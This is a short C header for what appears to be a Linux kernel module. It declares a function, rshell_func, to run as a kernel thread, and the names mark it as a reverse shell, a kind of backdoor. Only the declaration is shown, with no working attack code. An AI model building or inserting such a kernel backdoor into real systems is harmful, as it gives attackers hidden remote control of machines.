#ifndef REVERSE_SHELL_H
#define REVERSE_SHELL_H

#include <linux/kthread.h>

extern int rshell_func(void* data); // 'data' is not in use but must be present to match the signature for kthread

#endif // REVERSE_SHELL_H
